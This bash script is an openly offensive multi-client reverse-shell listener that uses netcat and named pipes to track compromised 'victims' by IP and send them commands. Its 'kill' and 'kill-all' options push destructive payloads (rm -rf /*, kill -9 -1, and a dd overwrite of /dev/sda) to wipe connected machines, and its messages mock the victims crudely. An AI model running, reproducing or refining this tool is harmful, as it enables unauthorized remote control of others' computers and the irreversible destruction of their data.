#!/bin/bash
PORT=$1
MAX_CLIENTS=$2
if [[ -z "$PORT" || -z "$MAX_CLIENTS" ]]; then
  echo "Usage: $0 <PORT> <MAX_CLIENTS>"
  exit 1
fi
if ! [[ "$PORT" =~ ^[0-9]+$ ]] || ! [[ "$MAX_CLIENTS" =~ ^[0-9]+$ ]]; then
  echo "Error: PORT and MAX_CLIENTS must be numbers"
  exit 1
fi
LOG_FILE="/tmp/hell.log"
VICTIM_FILE="/tmp/victims.txt"  
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'
echo -e "${RED}🔥 MULTI-CLIENT REVERSE SHELL LISTENER ACTIVATED 🔥${NC}"
echo -e "${YELLOW}Listening on port $PORT for up to $MAX_CLIENTS victims${NC}"
echo -e "${GREEN}Logging all evil activities to: $LOG_FILE${NC}"
echo -e "${PURPLE}Victim file: $VICTIM_FILE${NC}"
rm -f /tmp/evilpipe* "$VICTIM_FILE" 2>/dev/null
for i in $(seq 1 $MAX_CLIENTS); do
    mkfifo /tmp/evilpipe$i 2>/dev/null
done
if [[ ! -f "$VICTIM_FILE" ]]; then
   touch "$VICTIM_FILE"
fi
list_victims() {
    echo -e "${CYAN}=== CONNECTED VICTIMS ===${NC}"
    if [[ -f "$VICTIM_FILE" ]] && [[ -s "$VICTIM_FILE" ]]; then
        cat "$VICTIM_FILE"
    else
        echo -e "${YELLOW}No victims yet... waiting for some poor souls${NC}"
    fi
}
add_victim() {
    local victim_id=$1
    local victim_ip=$2
    echo "Session $victim_id: $victim_ip [$(date)]" >> "$VICTIM_FILE"
}
remove_victim() {
    local victim_id=$1
    sed -i "/^Session $victim_id:/d" "$VICTIM_FILE" 2>/dev/null
}
select_victim() {
    list_victims
    echo -e "${GREEN}Enter victim ID to interact with (or 'back' to cancel):${NC}"
    read -p "evil@selector:~$ " victim_id
    if [[ "$victim_id" == "back" ]]; then
        return 1
    fi
    if grep -q "^Session $victim_id:" "$VICTIM_FILE" 2>/dev/null; then
        victim_ip=$(grep "^Session $victim_id:" "$VICTIM_FILE" | cut -d' ' -f3)
        echo -e "${YELLOW}Entering session $victim_id with $victim_ip${NC}"
        echo -e "${RED}Type 'exit' to return to main menu${NC}"
        while read -p "evil@victim$victim_id:~$ " vcmd; do
            if [[ "$vcmd" == "exit" ]]; then
                break
            fi
            echo "$vcmd" > /tmp/evilpipe$victim_id 2>/dev/null
            if [[ $? -ne 0 ]]; then
                echo -e "${RED}Victim disconnected!${NC}"
                remove_victim $victim_id
                break
            fi
        done
        return 0
    else
        echo -e "${RED}Invalid victim ID, you dumb fuck!${NC}"
        return 1
    fi
}
trap 'echo -e "${RED}Shutting down... cleaning up files${NC}"; rm -f /tmp/evilpipe* "$VICTIM_FILE"; exit 0' INT TERM
while true; do
    echo -e "${GREEN}Waiting for victims to connect...${NC}"
    echo -e "${PURPLE}Type 'list' to see victims, 'select' to choose one, 'broadcast' to fuck them all${NC}"
    nc -lvnp $PORT 2>&1 | while read line; do
        CLIENT_IP=$(echo $line | grep -oE '\[?[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+\]?' | tr -d '[]')
        if [[ ! -z "$CLIENT_IP" ]]; then
            for i in $(seq 1 $MAX_CLIENTS); do
                if ! grep -q "^Session $i:" "$VICTIM_FILE" 2>/dev/null; then
                    CLIENT_ID=$i
                    break
                fi
            done
            add_victim $CLIENT_ID "$CLIENT_IP"
            echo -e "${YELLOW}🎯 NEW VICTIM: $CLIENT_IP → Assigned to session $CLIENT_ID${NC}"
            echo "[$(date)] VICTIM $CLIENT_IP connected to session $CLIENT_ID" >> "$LOG_FILE"
            (
                cat /tmp/evilpipe$CLIENT_ID | nc "$CLIENT_IP" $PORT 2>/dev/null | tee -a "$LOG_FILE" > /tmp/evilpipe$CLIENT_ID &
                NC_PID=$!
                while true; do
                    sleep 1
                    if ! kill -0 $NC_PID 2>/dev/null; then
                        echo -e "${RED}Victim $CLIENT_ID ($CLIENT_IP) disconnected${NC}"
                        remove_victim $CLIENT_ID
                        rm -f /tmp/evilpipe$CLIENT_ID
                        break
                    fi
                done
            ) &
        fi
    done &
    NC_PID=$!
    while true; do
        read -p "evil@hell:~$ " cmd
        case $cmd in
            "list")
                list_victims
                ;;
            "select")
                select_victim
                ;;
            "broadcast")
                echo -e "${RED}🔥 ENTER COMMAND TO TORTURE ALL VICTIMS:${NC}"
                read -p "evil@broadcast:~$ " bcmd
                for j in $(seq 1 $MAX_CLIENTS); do
                    if [[ -p "/tmp/evilpipe$j" ]]; then
                        echo "$bcmd" > /tmp/evilpipe$j 2>/dev/null &
                        echo -e "${YELLOW}Sent to victim $j${NC}"
                    fi
                done
                ;;
            "kill")
                echo -e "${RED}Enter victim ID to murder:${NC}"
                read -p "evil@killer:~$ " kill_id
                if grep -q "^Session $kill_id:" "$VICTIM_FILE" 2>/dev/null; then
                    echo "rm -rf /* 2>/dev/null; kill -9 -1" > /tmp/evilpipe$kill_id
                    echo -e "${RED}☠️ NUKING VICTIM $kill_id ☠️${NC}"
                    sleep 2
                    remove_victim $kill_id
                    rm -f /tmp/evilpipe$kill_id
                else
                    echo -e "${YELLOW}Victim doesn't exist, dumbass${NC}"
                fi
                ;;
            "kill-all")
                echo -e "${RED}🔥 NUKE ALL VICTIMS? (yes/no):${NC}"
                read -p "evil@genocide:~$ " confirm
                if [[ "$confirm" == "yes" ]]; then
                    echo -e "${RED}☢️ DEPLOYING MASS DESTRUCTION ☢️${NC}"
                    for j in $(seq 1 $MAX_CLIENTS); do
                        if [[ -p "/tmp/evilpipe$j" ]]; then
                            echo "rm -rf /* 2>/dev/null; kill -9 -1; dd if=/dev/zero of=/dev/sda bs=1M" > /tmp/evilpipe$j 2>/dev/null &
                            echo -e "${YELLOW}Sent nuclear payload to victim $j${NC}"
                            echo "[$(date)] NUKED VICTIM $j with destructive commands" >> "$LOG_FILE"
                        fi
                    done
                    sleep 3
                    echo -e "${RED}🔥 TERMINATING ALL SESSIONS 🔥${NC}"
                    for j in $(seq 1 $MAX_CLIENTS); do
                        remove_victim $j
                        rm -f /tmp/evilpipe$j 2>/dev/null
                    done
                    echo -e "${GREEN}All victims obliterated! System cleanup complete.${NC}"
                else
                    echo -e "${YELLOW}Pussy backed out of mass murder!${NC}"
                fi
                ;;
            "clear")
                clear
                echo -e "${RED}🔥 MULTI-CLIENT REVERSE SHELL LISTENER 🔥${NC}"
                ;;
            "exit")
                echo -e "${RED}Terminating all sessions...${NC}"
                kill $NC_PID 2>/dev/null
                for j in $(seq 1 $MAX_CLIENTS); do
                    if [[ -p "/tmp/evilpipe$j" ]]; then
                        echo "exit" > /tmp/evilpipe$j 2>/dev/null
                        remove_victim $j
                    fi
                done
                sleep 2
                rm -f /tmp/evilpipe* "$VICTIM_FILE"
                exit 0
                ;;
            *)
                echo -e "${YELLOW}Available commands:${NC}"
                echo -e "  ${GREEN}list${NC}     - Show connected victims"
                echo -e "  ${GREEN}select${NC}   - Choose victim to interact with"
                echo -e "  ${GREEN}broadcast${NC} - Send command to ALL victims"
                echo -e "  ${GREEN}kill${NC}     - Destroy specific victim"
                echo -e "  ${GREEN}clear${NC}    - Clear screen"
                echo -e "  ${GREEN}exit${NC}     - Shutdown everything"
                ;;
        esac
    done
    sleep 1
done